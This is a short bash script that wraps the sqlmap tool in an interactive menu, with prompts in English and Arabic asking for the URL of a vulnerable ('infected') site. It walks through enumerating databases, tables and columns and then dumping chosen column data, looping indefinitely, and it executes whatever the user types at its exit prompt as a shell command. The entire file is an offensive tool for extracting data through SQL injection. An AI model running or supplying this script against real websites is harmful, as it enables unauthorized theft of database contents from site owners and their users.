#!/bin/bash
#version 1.0
#Copyright 2017 karimAmougay
clear
red='\033[0;31m'
black='\033[0;30m'
green='\033[0;32m'
brown='\033[0;33m'
orange='\033[0;33m'
blue='\033[0;34m'
purple='\033[0;35m'
cyal='\033[0;36m'
Lgray='\033[0;37m'
Dgray='\033[1;30m'
Lred='\033[1;31m'
Lgreen='\033[1;32m'
yellow='\033[1;33m'
Lblue='\033[1;34m'
Lpurple='\033[1;35m'
Lcyal='\033[1;36m'
white='\033[1;37m'
none='\033[0m'
while true;do
echo -e  "Enter The ${red} URL${Lgreen} ادخل عنوان الموقع المصاب${none} : "
echo -e "${red}EX :${yellow} WWW.EXAMPLE.COM/LOGIN.PHP?ID=1${none}"
read -p "AMG-SQL>>" URL
sqlmap -u $URL --dbs
echo -e "${Lgray}(sqlmap -u $URL --dbs)${none}"
echo -e "${Lpurple}Database Name اسم قاعدة البيانات${none} : "
read -p "AMG-SQL>>" DB
sqlmap -u $URL -D $DB --tables
echo -e "${Lgray}(sqlmap -u $URL -D $DB --tables)${none}"
echo -e "${Lpurple}Table Name اسم القائمة${none} : "
read -p "AMG-SQL>>" TB
sqlmap -u $URL --dbs -D $DB --tables -T $TB --columns
echo -e "${Lgray}(sqlmap -u $URL --dbs -D $DB --tables -T $TB --columns)${none}"
echo -e "${Lpurple}Column Name اسم العمود${none} : "
read -p "AMG-SQL>>" CM
sqlmap -u $URL --dbs -D $DB --tables -T $TB --columns -C $CM --dump
echo -e "${Lgray}(sqlmap -u $URL --dbs -D $DB --tables -T $TB --columns -C $CM --dump)${none}"
echo -e "${Lblue}exit${red} هل تريد الخروج؟اكتب${none}  "
read -p "AMG-SQL>>" Ex
$Ex
done
